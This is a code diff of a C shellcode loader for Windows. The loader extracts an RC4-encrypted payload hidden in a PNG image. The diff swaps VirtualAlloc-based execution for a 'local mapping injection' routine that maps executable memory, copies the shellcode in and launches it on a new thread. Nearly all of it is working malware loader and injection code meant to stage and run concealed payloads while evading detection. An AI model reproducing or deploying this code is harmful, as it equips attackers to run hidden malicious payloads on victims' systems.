@@ -19,7 +19,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	  0x501EA8FD
+#define MARKED_IDAT_HASH	  0x8477E193
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -85,10 +85,6 @@ VOID Rc4EncryptDecrypt(IN PBYTE pInputBuffer, IN SIZE_T sInputBuffSize, IN PBYTE
 	context.i = i;
 	context.j = j;
 }
-
-
-// ---------------------------------------------------------------------------------------------------------------------------------------------
-// ---------------------------------------------------------------------------------------------------------------------------------------------
 
 // Function to extract the decrypted payload from the PNG file
 BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OUT PBYTE* ppDecryptedBuff, OUT PSIZE_T psDecryptedBuffLength) {
@@ -195,8 +191,6 @@ BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OU
 	return bFoundHash;
 }
 
-// ---------------------------------------------------------------------------------------------------------------------------------------------
-
 // Function to read a file from disk
 BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {
 
@@ -245,8 +239,41 @@ _END_OF_FUNC:
 	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
 }
 
-// ---------------------------------------------------------------------------------------------------------------------------------------------
+// Function to do Local Mapping Injection of the payload
+BOOL LocalMappingInjection(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress) {
 
+	HANDLE		hMappingFile = NULL;
+	PBYTE		pMappingAddress = NULL;
+
+	// Check input
+	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
+		return FALSE;
+
+	// Create a mapping file
+	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
+		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+	printf("[i] Mapping File Created \n");
+
+	// Map the file
+	if (!(pMappingAddress = MapViewOfFile(hMappingFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0x00, 0x00, sShellcodeSize))) {
+		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+	printf("[i] Memory Mapped at: 0x%p \n", pMappingAddress);
+
+	// Copy the shellcode to the mapped memory
+	*ppInjectionAddress = memcpy(pMappingAddress, pShellcodeAddress, sShellcodeSize);
+
+// Error handler
+_END_OF_FUNC:
+	if (hMappingFile)
+		CloseHandle(hMappingFile);
+	return (*ppInjectionAddress) ? TRUE : FALSE;
+}
+
+// ---------------------------------------------------------------------------------------------------------------------------------------------
 
 int fetchPayload() {
 
@@ -263,21 +290,19 @@ int fetchPayload() {
 	if (!ExtractDecryptedPayload(pPngFileBuffer, sPngFileSize, &pShellcodeBuffer, &sShellcodeSize))
 		return -1;
 
-	// Allocate executable memory for the shellcode
-	LPVOID pExecMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!pExecMemory) {
-		printf("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
+	// Inject the shellcode into the local mapping
+	printf("[i] Injecting Shellcode Into Local Mapped Memory \n");
+	PBYTE pInjectionAddress = NULL;
+	if (!LocalMappingInjection(pShellcodeBuffer, sShellcodeSize, &pInjectionAddress)) {
+		printf("[!] LocalMappingInjection Failed With Error: %d \n", GetLastError());
 		return -1;
 	}
 
-	// Copy the shellcode to the allocated memory
-	memcpy(pExecMemory, pShellcodeBuffer, sShellcodeSize);
-
 	// Create a thread to execute the shellcode
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMemory, NULL, 0, NULL);
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInjectionAddress, NULL, 0, NULL);
 	if (!hThread) {
 		printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
-		VirtualFree(pExecMemory, 0, MEM_RELEASE);
+		VirtualFree(pInjectionAddress, 0, MEM_RELEASE);
 		return -1;
 	}
 
@@ -286,6 +311,6 @@ int fetchPayload() {
 
 	// Clean up
 	CloseHandle(hThread);
-	VirtualFree(pExecMemory, 0, MEM_RELEASE);
+	VirtualFree(pInjectionAddress, 0, MEM_RELEASE);
 	return 0;
 }
